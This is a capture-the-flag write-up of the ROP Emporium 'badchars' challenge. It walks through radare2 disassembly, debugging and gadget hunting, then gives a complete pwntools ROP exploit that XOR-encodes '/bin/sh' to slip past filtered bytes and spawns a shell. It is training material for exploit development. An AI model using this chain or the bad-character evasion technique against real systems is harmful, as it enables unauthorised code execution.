# badchars

Downloading, unzipping, and running the [challenge file](https://ropemporium.com/binary/badchars.zip):

```sh
$ ./badchars
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    17337 segmentation fault (core dumped)  ./badchars
```

Hey that's convenient - we know which characters we can't include in our payload.
So `/bin/cat flag.txt` and `/bin/sh` are both out (at least in their naive form).

Let's take a look at the binary:

```asm
[0x00400790]> pdf @ sym.pwnme
/ (fcn) sym.pwnme 234
|   sym.pwnme ();
|           ; var size_t s1 @ rbp-0x30
|           ; var char *ptr @ rbp-0x28
|           ; CALL XREF from sym.main (0x4008df)
|           0x004008f5      55             push rbp
|           0x004008f6      4889e5         mov rbp, rsp
|           0x004008f9      4883ec30       sub rsp, 0x30               ; '0'
|           0x004008fd      48c745d00000.  mov qword [s1], 0
|           0x00400905      bf00020000     mov edi, 0x200              ; 512 ; size_t size
|           0x0040090a      e841feffff     call sym.imp.malloc         ; void *malloc(size_t size)
|           0x0040090f      488945d8       mov qword [ptr], rax
|           0x00400913      488b45d8       mov rax, qword [ptr]
|           0x00400917      4885c0         test rax, rax
|       ,=< 0x0040091a      7418           je 0x400934
|       |   0x0040091c      488b45d8       mov rax, qword [ptr]
|       |   0x00400920      ba00020000     mov edx, 0x200              ; 512 ; size_t n
|       |   0x00400925      be00000000     mov esi, 0                  ; int c
|       |   0x0040092a      4889c7         mov rdi, rax                ; void *s
|       |   0x0040092d      e8defdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|      ,==< 0x00400932      eb0a           jmp 0x40093e
|      ||   ; CODE XREF from sym.pwnme (0x40091a)
|      |`-> 0x00400934      bf01000000     mov edi, 1                  ; int status
|      |    0x00400939      e832feffff     call sym.imp.exit           ; void exit(int status)
|      |    ; CODE XREF from sym.pwnme (0x400932)
|      `--> 0x0040093e      488d45d0       lea rax, [s1]
|           0x00400942      4883c010       add rax, 0x10
|           0x00400946      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x0040094b      be00000000     mov esi, 0                  ; int c
|           0x00400950      4889c7         mov rdi, rax                ; void *s
|           0x00400953      e8b8fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400958      bf080c4000     mov edi, str.badchars_are:_b_i_c____space__f_n_s ; 0x400c08 ; "badchars are: b i c / <space> f n s" ; const char *s
|           0x0040095d      e87efdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400962      bf2c0c4000     mov edi, 0x400c2c           ; const char *format
|           0x00400967      b800000000     mov eax, 0
|           0x0040096c      e88ffdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400971      488b15180720.  mov rdx, qword [obj.stdin]  ; [0x601090:8]=0 ; FILE *stream
|           0x00400978      488b45d8       mov rax, qword [ptr]
|           0x0040097c      be00020000     mov esi, 0x200              ; 512 ; int size
|           0x00400981      4889c7         mov rdi, rax                ; char *s
|           0x00400984      e8a7fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400989      488945d8       mov qword [ptr], rax
|           0x0040098d      488b45d8       mov rax, qword [ptr]
|           0x00400991      be00020000     mov esi, 0x200              ; 512
|           0x00400996      4889c7         mov rdi, rax
|           0x00400999      e852000000     call sym.nstrlen
|           0x0040099e      488945d0       mov qword [s1], rax
|           0x004009a2      488b55d0       mov rdx, qword [s1]
|           0x004009a6      488b45d8       mov rax, qword [ptr]
|           0x004009aa      4889d6         mov rsi, rdx
|           0x004009ad      4889c7         mov rdi, rax
|           0x004009b0      e88b000000     call sym.checkBadchars
|           0x004009b5      488b55d0       mov rdx, qword [s1]         ; size_t n
|           0x004009b9      488b45d8       mov rax, qword [ptr]
|           0x004009bd      488d4dd0       lea rcx, [s1]
|           0x004009c1      4883c110       add rcx, 0x10
|           0x004009c5      4889c6         mov rsi, rax                ; const void *s2
|           0x004009c8      4889cf         mov rdi, rcx                ; void *s1
|           0x004009cb      e870fdffff     call sym.imp.memcpy         ; void *memcpy(void *s1, const void *s2, size_t n)
|           0x004009d0      488b45d8       mov rax, qword [ptr]
|           0x004009d4      4889c7         mov rdi, rax                ; void *ptr
|           0x004009d7      e8f4fcffff     call sym.imp.free           ; void free(void *ptr)
|           0x004009dc      90             nop
|           0x004009dd      c9             leave
\           0x004009de      c3             ret
```

So the binary calls `checkBadchars` before `memcpy`ing our `stdin` into the vulnerable buffer.
Let's take a look at `checkBadchars`:

```asm
[0x00400790]> pdf @ sym.checkBadchars 
/ (fcn) sym.checkBadchars 158
|   sym.checkBadchars (int arg1, unsigned int arg2);
|           ; var unsigned int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_1fh @ rbp-0x1f
|           ; var int local_1eh @ rbp-0x1e
|           ; var int local_1dh @ rbp-0x1d
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_1bh @ rbp-0x1b
|           ; var int local_1ah @ rbp-0x1a
|           ; var int local_19h @ rbp-0x19
|           ; var unsigned int local_10h @ rbp-0x10
|           ; var int local_8h @ rbp-0x8
|           ; arg int arg1 @ rdi
|           ; arg unsigned int arg2 @ rsi
|           ; CALL XREF from sym.pwnme (0x4009b0)
|           0x00400a40      55             push rbp
|           0x00400a41      4889e5         mov rbp, rsp
|           0x00400a44      48897dd8       mov qword [local_28h], rdi  ; arg1
|           0x00400a48      488975d0       mov qword [local_30h], rsi  ; arg2
|           0x00400a4c      c645e062       mov byte [local_20h], 0x62  ; 'b' ; 98
|           0x00400a50      c645e169       mov byte [local_1fh], 0x69  ; 'i' ; 105
|           0x00400a54      c645e263       mov byte [local_1eh], 0x63  ; 'c' ; 99
|           0x00400a58      c645e32f       mov byte [local_1dh], 0x2f  ; '/' ; 47
|           0x00400a5c      c645e420       mov byte [local_1ch], 0x20  ; 32
|           0x00400a60      c645e566       mov byte [local_1bh], 0x66  ; 'f' ; 102
|           0x00400a64      c645e66e       mov byte [local_1ah], 0x6e  ; 'n' ; 110
|           0x00400a68      c645e773       mov byte [local_19h], 0x73  ; 's' ; 115
|           0x00400a6c      48c745f80000.  mov qword [local_8h], 0
|           0x00400a74      48c745f00000.  mov qword [local_10h], 0
|           0x00400a7c      48c745f80000.  mov qword [local_8h], 0
|       ,=< 0x00400a84      eb4b           jmp 0x400ad1
|       |   ; CODE XREF from sym.checkBadchars (0x400ad9)
|      .--> 0x00400a86      48c745f00000.  mov qword [local_10h], 0
|     ,===< 0x00400a8e      eb35           jmp 0x400ac5
|     |:|   ; CODE XREF from sym.checkBadchars (0x400aca)
|    .----> 0x00400a90      488b55d8       mov rdx, qword [local_28h]
|    :|:|   0x00400a94      488b45f8       mov rax, qword [local_8h]
|    :|:|   0x00400a98      4801d0         add rax, rdx                ; '('
|    :|:|   0x00400a9b      0fb610         movzx edx, byte [rax]
|    :|:|   0x00400a9e      488d4de0       lea rcx, [local_20h]
|    :|:|   0x00400aa2      488b45f0       mov rax, qword [local_10h]
|    :|:|   0x00400aa6      4801c8         add rax, rcx                ; '&'
|    :|:|   0x00400aa9      0fb600         movzx eax, byte [rax]
|    :|:|   0x00400aac      38c2           cmp dl, al
|   ,=====< 0x00400aae      7510           jne 0x400ac0
|   |:|:|   0x00400ab0      488b55d8       mov rdx, qword [local_28h]
|   |:|:|   0x00400ab4      488b45f8       mov rax, qword [local_8h]
|   |:|:|   0x00400ab8      4801d0         add rax, rdx                ; '('
|   |:|:|   0x00400abb      c600eb         mov byte [rax], 0xeb        ; [0xeb:1]=255 ; 235
|  ,======< 0x00400abe      eb0c           jmp 0x400acc
|  ||:|:|   ; CODE XREF from sym.checkBadchars (0x400aae)
|  |`-----> 0x00400ac0      488345f001     add qword [local_10h], 1
|  | :|:|   ; CODE XREF from sym.checkBadchars (0x400a8e)
|  | :`---> 0x00400ac5      48837df007     cmp qword [local_10h], 7    ; [0x7:8]=-1 ; 7
|  | `====< 0x00400aca      76c4           jbe 0x400a90
|  |   :|   ; CODE XREF from sym.checkBadchars (0x400abe)
|  `------> 0x00400acc      488345f801     add qword [local_8h], 1
|      :|   ; CODE XREF from sym.checkBadchars (0x400a84)
|      :`-> 0x00400ad1      488b45f8       mov rax, qword [local_8h]
|      :    0x00400ad5      483b45d0       cmp rax, qword [local_30h]
|      `==< 0x00400ad9      72ab           jb 0x400a86
|           0x00400adb      90             nop
|           0x00400adc      5d             pop rbp
\           0x00400add      c3             ret
```

It's a little obtuse. We can see the "bad chars" setup on the function stack, but it's a little hard to visualize the execution graph. We can enter visual mode by entering 'V' and then pressing the spacebar.
That will take us to the beginning of the binary. To go to `checkBadchars` we can press 'o' and then enter `sym.checkBadchars`:

```asm
                                                                            .----------------------------------------------------------.                                                                            
                                                                            | [0x400a40]                                               |                                                                            
                                                                            |  (fcn) sym.checkBadchars 158                             |                                                                            
                                                                            |    sym.checkBadchars (int arg1, unsigned int arg2);      |                                                                            
                                                                            |  ; var unsigned int local_30h @ rbp-0x30                 |                                                                            
                                                                            |  ; var int local_28h @ rbp-0x28                          |                                                                            
                                                                            |  ; var int local_20h @ rbp-0x20                          |                                                                            
                                                                            |  ; var int local_1fh @ rbp-0x1f                          |                                                                            
                                                                            |  ; var int local_1eh @ rbp-0x1e                          |                                                                            
                                                                            |  ; var int local_1dh @ rbp-0x1d                          |                                                                            
                                                                            |  ; var int local_1ch @ rbp-0x1c                          |                                                                            
                                                                            |  ; var int local_1bh @ rbp-0x1b                          |                                                                            
                                                                            |  ; var int local_1ah @ rbp-0x1a                          |                                                                            
                                                                            |  ; var int local_19h @ rbp-0x19                          |                                                                            
                                                                            |  ; var unsigned int local_10h @ rbp-0x10                 |                                                                            
                                                                            |  ; var int local_8h @ rbp-0x8                            |                                                                            
                                                                            |  ; arg int arg1 @ rdi                                    |                                                                            
                                                                            |  ; arg unsigned int arg2 @ rsi                           |                                                                            
                                                                            |  ; CALL XREF from sym.pwnme (0x4009b0)                   |                                                                            
                                                                            |  push rbp                                                |                                                                            
                                                                            |  mov rbp, rsp                                            |                                                                            
                                                                            |  ; arg1                                                  |                                                                            
                                                                            |  mov qword [local_28h], rdi                              |                                                                            
                                                                            |  ; arg2                                                  |                                                                            
                                                                            |  mov qword [local_30h], rsi                              |                                                                            
                                                                            |  ; 'b'                                                   |                                                                            
                                                                            |  ; 98                                                    |                                                                            
                                                                            |  mov byte [local_20h], 0x62                              |                                                                            
                                                                            |  ; 'i'                                                   |                                                                            
                                                                            |  ; 105                                                   |                                                                            
                                                                            |  mov byte [local_1fh], 0x69                              |                                                                            
                                                                            |  ; 'c'                                                   |                                                                            
                                                                            |  ; 99                                                    |                                                                            
                                                                            |  mov byte [local_1eh], 0x63                              |                                                                            
                                                                            |  ; '/'                                                   |                                                                            
                                                                            |  ; 47                                                    |                                                                            
                                                                            |  mov byte [local_1dh], 0x2f                              |                                                                            
                                                                            |  ; 32                                                    |                                                                            
                                                                            |  mov byte [local_1ch], 0x20                              |                                                                            
                                                                            |  ; 'f'                                                   |                                                                            
                                                                            |  ; 102                                                   |                                                                            
                                                                            |  mov byte [local_1bh], 0x66                              |                                                                            
                                                                            |  ; 'n'                                                   |                                                                            
                                                                            |  ; 110                                                   |                                                                            
                                                                            |  mov byte [local_1ah], 0x6e                              |                                                                            
                                                                            |  ; 's'                                                   |                                                                            
                                                                            |  ; 115                                                   |                                                                            
                                                                            |  mov byte [local_19h], 0x73                              |                                                                            
                                                                            |  mov qword [local_8h], 0                                 |                                                                            
                                                                            |  mov qword [local_10h], 0                                |                                                                            
                                                                            |  mov qword [local_8h], 0                                 |                                                                            
                                                                            |  jmp 0x400ad1;[ga]                                       |                                                                            
                                                                            |                                                          |                                                                            
                                                                            |                                                          |                                                                            
                                                                            |                                                          |                                                                            
                                                                            |                                                          |                                                                            
                                                                            |                                                          |                                                                            
                                                                            `----------------------------------------------------------'                                                                            
                                                                                v                                                                                                                                   
                                                                                |                                                                                                                                   
                                                                                '-----.                                                                                                                             
                  .---------------------------------------------------------------------.                                                                                                                           
                  |                                                                   | |                                                                                                                           
                  |                                                             .---------------------------------------------------.                                                                               
                  |                                                             |  0x400ad1 [ga]                                    |                                                                               
                  |                                                             |  ; CODE XREF from sym.checkBadchars (0x400a84)    |                                                                               
                  |                                                             |  mov rax, qword [local_8h]                        |                                                                               
                  |                                                             |  cmp rax, qword [local_30h]                       |                                                                               
                  |                                                             |  jb 0x400a86;[gd]                                 |                                                                               
                  |                                                             `---------------------------------------------------'                                                                               
                  |                                                                   t f                                                                                                                           
                  |                                                                   | |                                                                                                                           
                  |                                             .---------------------' |                                                                                                                           
                  |                                             |                       '-------------------------------.                                                                                           
                  |                                             |                                                       |                                                                                           
                  |                                         .---------------------------------------------------.   .--------------------.                                                                          
                  |                                         |  0x400a86 [gd]                                    |   |  0x400adb [gi]     |                                                                          
                  |                                         |  ; CODE XREF from sym.checkBadchars (0x400ad9)    |   |  nop               |                                                                          
                  |                                         |  mov qword [local_10h], 0                         |   |  pop rbp           |                                                                          
                  |                                         |  jmp 0x400ac5;[gc]                                |   |  ret               |                                                                          
                  |                                         `---------------------------------------------------'   `--------------------'                                                                          
                  |                                             v                                                                                                                                                   
                  |                                             |                                                                                                                                                   
                  |.------------------------------------------------.                                                                                                                                               
                  ||                                              | |                                                                                                                                               
                  ||                                        .---------------------------------------------------.                                                                                                   
                  ||                                        |  0x400ac5 [gc]                                    |                                                                                                   
                  ||                                        |  ; CODE XREF from sym.checkBadchars (0x400a8e)    |                                                                                                   
                  ||                                        |  ; [0x7:8]=-1                                     |                                                                                                   
                  ||                                        |  ; 7                                              |                                                                                                   
                  ||                                        |  cmp qword [local_10h], 7                         |                                                                                                   
                  ||                                        |  jbe 0x400a90;[gf]                                |                                                                                                   
                  ||                                        `---------------------------------------------------'                                                                                                   
                  ||                                              t f                                                                                                                                               
                  ||                                              | |                                                                                                                                               
                  ||                    .-------------------------' |                                                                                                                                               
                  ||                    |                           '-----------------------------------------------.                                                                                               
                  ||                    |                                                                           |                                                                                               
                  ||                .---------------------------------------------------.                           |                                                                                               
                  ||                |  0x400a90 [gf]                                    |                           |                                                                                               
                  ||                |  ; CODE XREF from sym.checkBadchars (0x400aca)    |                           |                                                                                               
                  ||                |  mov rdx, qword [local_28h]                       |                           |                                                                                               
                  ||                |  mov rax, qword [local_8h]                        |                           |                                                                                               
                  ||                |  ; '('                                            |                           |                                                                                               
                  ||                |  add rax, rdx                                     |                           |                                                                                               
                  ||                |  movzx edx, byte [rax]                            |                           |                                                                                               
                  ||                |  lea rcx, [local_20h]                             |                           |                                                                                               
                  ||                |  mov rax, qword [local_10h]                       |                           |                                                                                               
                  ||                |  ; '&'                                            |                           |                                                                                               
                  ||                |  add rax, rcx                                     |                           |                                                                                               
                  ||                |  movzx eax, byte [rax]                            |                           |                                                                                               
                  ||                |  cmp dl, al                                       |                           |                                                                                               
                  ||                |  jne 0x400ac0;[ge]                                |                           |                                                                                               
                  ||                |                                                   |                           |                                                                                               
                  ||                `---------------------------------------------------'                           |                                                                                               
                  ||                        f t                                                                     |                                                                                               
                  ||                        | |                                                                     |                                                                                               
                  ||                        | '-----------------.                                                   |                                                                                               
                  ||    .-------------------'                   |                                                   |                                                                                               
                  ||    |                                       |                                                   |                                                                                               
                  ||.----------------------------------.    .---------------------------------------------------.   |                                                                                               
                  |||  0x400ab0 [gh]                   |    |  0x400ac0 [ge]                                    |   |                                                                                               
                  |||  mov rdx, qword [local_28h]      |    |  ; CODE XREF from sym.checkBadchars (0x400aae)    |   |                                                                                               
                  |||  mov rax, qword [local_8h]       |    |  add qword [local_10h], 1                         |   |                                                                                               
                  |||  ; '('                           |    `---------------------------------------------------'   |                                                                                               
                  |||  add rax, rdx                    |        v                                                   |                                                                                               
                  |||  ; [0xeb:1]=255                  |        |                                                   |                                                                                               
                  |||  ; 235                           |        |                                                   |                                                                                               
                  |||  mov byte [rax], 0xeb            |        |                                                   |                                                                                               
                  |||  jmp 0x400acc;[gg]               |        |                                                   |                                                                                               
                  |||                                  |        |                                                   |                                                                                               
                  ||`----------------------------------'        |                                                   |                                                                                               
                  ||    v                                       |                                                   |                                                                                               
                  ||    |                                       |                                                   |                                                                                               
                  ||    '--------------------------------------.|                                                   |                                                                                               
                  |`--------------------------------------------'                                                   |                                                                                               
                  |                                            | .--------------------------------------------------'                                                                                               
                  |                                            | |                                                                                                                                                  
                  |                                      .---------------------------------------------------.                                                                                                      
                  |                                      |  0x400acc [gg]                                    |                                                                                                      
                  |                                      |  ; CODE XREF from sym.checkBadchars (0x400abe)    |                                                                                                      
                  |                                      |  add qword [local_8h], 1                          |                                                                                                      
                  |                                      `---------------------------------------------------'                                                                                                      
                  |                                          v                                                                                                                                                      
                  |                                          |                                                                                                                                                      
                  `------------------------------------------
```

Ok so still a little obtuse. We can see that the very first conditional checks if `local_8h` is lower than `local_30h`. Then at the very bottom we can see `local_8h` being incremented, but working through the entirety of the logic of this is going to be a little tricky and time consuming.

Instead, let's try some sample `stdin` inputs and watch what happens. We can create a `payload` file which has a random assortment of characters, including some of the "badchars":

```
/ abcdefghijklmnopqrstuvwxyz
```

Now let's step through the binary with the payload selected as `stdin`:

```asm

$ r2 -A -Rstdin=payload -d badchars
Process with PID 24056 started...
= attach 24056 24056
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[TOFIX: afta can't run in debugger mode.ions (afta)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
= attach 24056 24056
24056
 -- It's not you, it's me.
[0x7f8cc46d9ea0]> dcu sym.checkBadchars 
Continue until 0x00400a40 using 1 bpsize
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> hit breakpoint at: 400a40
```

We could enter visual mode and step through the function, but for simplicity, let's just look at the contents of the stack in the `pwnme` function after `checkBadchars` and the `memcpy` are called:

```asm
[0x00400a40]> dcu 0x004009dc
Continue until 0x004009dc using 1 bpsize
hit breakpoint at: 4009dc
[0x004009dc]> px @ rsp
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffd8c5168d0  1d00 0000 0000 0000 6052 0c02 0000 0000  ........`R......
0x7ffd8c5168e0  ebeb 61eb eb64 65eb 6768 eb6a 6b6c 6deb  ..a..de.gh.jklm.
0x7ffd8c5168f0  6f70 7172 eb74 7576 7778 797a 0a00 0000  opqr.tuvwxyz....
0x7ffd8c516900  1069 518c fd7f 0000 e408 4000 0000 0000  .iQ.......@.....
```

We can see that the 'badchars' have been replaced with the value `eb`. That should be enough reverse engineering for the moment, though it is a useful exercise to walk through the assembly to understand how the logic flow works.

So we want to put a string like '/bin/sh' into our vulnerable stack variable, but we can't directly use a number of the character values in that string.
Since ROP is essentially just arbitrary code execution, one option is to put a different string into our stack smash, and then manipulate the bytes of that string so that they become our ultimate target.
There are probably a variety of ways to go about this. One good and potentially simple option is XOR:

```asm
[0x004009dc]> /R xor
  0x004006bb               0000  add byte [rax], al
  0x004006bd               0000  add byte [rax], al
  0x004006bf               00ff  add bh, bh
  0x004006c1         3542092000  xor eax, 0x200942
  0x004006c6       ff2544092000  jmp qword [rip + 0x200944]

  0x004006f2               3209  xor cl, byte [rcx]
  0x004006f4               2000  and byte [rax], al
  0x004006f6         6802000000  push 2
  0x004006fb         e9c0ffffff  jmp 0x4006c0

  0x004008fc             3048c7  xor byte [rax - 0x39], cl
  0x004008ff             45d000  rol byte [r8], 1
  0x00400902               0000  add byte [rax], al
  0x00400904       00bf00020000  add byte [rdi + 0x200], bh
  0x0040090a         e841feffff  call 0x400750

  0x00400b2a               0000  add byte [rax], al
  0x00400b2c               0000  add byte [rax], al
  0x00400b2e               0000  add byte [rax], al
  0x00400b30             453037  xor byte [r15], r14b
  0x00400b33                 c3  ret

  0x00400b31               3037  xor byte [rdi], dh
  0x00400b33                 c3  ret
```

So because this is a bit of a contrived challenge again, we find a convenient xor gadget at `0x00400b30` 🎆
It will require us to be able to pop values into `r15` and `r14`, so let's check on that:

```asm
[0x004009dc]> /R pop r14
  0x00400b3d               415d  pop r13
  0x00400b3f                 c3  ret
  0x00400b40               415e  pop r14
  0x00400b42               415f  pop r15
  0x00400b44                 c3  ret

  0x00400b3e                 5d  pop rbp
  0x00400b3f                 c3  ret
  0x00400b40               415e  pop r14
  0x00400b42               415f  pop r15
  0x00400b44                 c3  ret

  0x00400bac               415c  pop r12
  0x00400bae               415d  pop r13
  0x00400bb0               415e  pop r14
  0x00400bb2               415f  pop r15
  0x00400bb4                 c3  ret

  0x00400bad                 5c  pop rsp
  0x00400bae               415d  pop r13
  0x00400bb0               415e  pop r14
  0x00400bb2               415f  pop r15
  0x00400bb4                 c3  ret

  0x00400baf                 5d  pop rbp
  0x00400bb0               415e  pop r14
  0x00400bb2               415f  pop r15
  0x00400bb4                 c3  ret
```

Well that's pretty convenient as well...

Once again, we'll want to use the data section to store our crafted argument:

```asm
[0x004009dc]> iS
[Sections]
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   384 0x004002c8   384 -r-- .dynsym
06 0x00000448   151 0x00400448   151 -r-- .dynstr
07 0x000004e0    32 0x004004e0    32 -r-- .gnu.version
08 0x00000500    48 0x00400500    48 -r-- .gnu.version_r
09 0x00000530    96 0x00400530    96 -r-- .rela.dyn
10 0x00000590   264 0x00400590   264 -r-- .rela.plt
11 0x00000698    26 0x00400698    26 -r-x .init
12 0x000006c0   192 0x004006c0   192 -r-x .plt
13 0x00000780     8 0x00400780     8 -r-x .plt.got
14 0x00000790  1074 0x00400790  1074 -r-x .text
15 0x00000bc4     9 0x00400bc4     9 -r-x .fini
16 0x00000bd0   103 0x00400bd0   103 -r-- .rodata
17 0x00000c38    84 0x00400c38    84 -r-- .eh_frame_hdr
18 0x00000c90   372 0x00400c90   372 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000   112 0x00601000   112 -rw- .got.plt
25 0x00001070    16 0x00601070    16 -rw- .data
26 0x00001080     0 0x00601080    48 -rw- .bss
27 0x00001080    52 0x00000000    52 ---- .comment
28 0x00001bf7   268 0x00000000   268 ---- .shstrtab
29 0x000010b8  2040 0x00000000  2040 ---- .symtab
30 0x000018b0   839 0x00000000   839 ---- .strtab
```

So we have our xor gadget, a gadget for popping values into the appropriate registers, and a place to put our payload.
We're missing just one more thing.
The xor gadget looks like: `xor byte [r15], r14b; ret`
That gadget xors the value of `r14` with the value in memory at the address of `r15` and then stores the result in memory at the address of `r15`.
The last gadget we need is one which will let us store an arbitrary value in an arbitrary memory location:

```asm

[0x004009dc]> /R mov
... (A BUNCH OF LINES WE DON'T CARE ABOUT SKIPPED OVER) ...

  0x00400b34           4d896500  mov qword [r13], r12
  0x00400b38                 c3  ret

... (A BUNCH MORE LINES WE DON'T CARE ABOUT SKIPPED OVER) ...

```

That's a pretty convenient write primitive. As long as we can control `r12` and `r13`, we can put arbitrary values arbitrary places in memory.

Our exploit ends up being pretty straightforwards from here. We want to store our "to-be-transformed" string in the data section, and then iterate through it, using xor to transform the values into our target:

```python

from pwn import *

prog = process("./badchars")

xor = p64(0x00400b30) # xor byte [r15], r14b; ret
mov = p64(0x00400b34) # mov qword [r13], r12; ret
pop_rdi = p64(0x00400b39) # pop rdi; ret
pop_r12_r13 = p64(0x00400b3b) # pop r12; pop r13; ret
pop_r14_r15 = p64(0x00400b40) # pop r14; pop r15; ret
pop_r15 = p64(0x00400b42) # pop r15; ret
data_addr = [p64(a) for a in range(0x00601074, 0x0060107c)]
system_call = p64(0x004006f0)

payload = "A" * 40

payload += pop_r12_r13
payload += p64(0x0068732f6e69622f ^ 0xa6a6a6a6a6a6a6a6) # /bin/sh in hex xor'd 0xa6
payload += data_addr[0]
payload += mov
payload += pop_r14_r15
payload += p64(0xa6a6a6a6a6a6a6a6)
payload += data_addr[0]
for i in range(1, 8):
    payload += xor
    payload += pop_r15
    payload += data_addr[i]

payload += xor

payload += pop_rdi
payload += data_addr[0]

payload += system_call

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
```

```sh
$ python exploit.py
[+] Starting local process './badchars': pid 28259
badchars by ROP Emporium
64bits

badchars are: b i c / <space>
[*] Switching to interactive mode
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

And we're in!
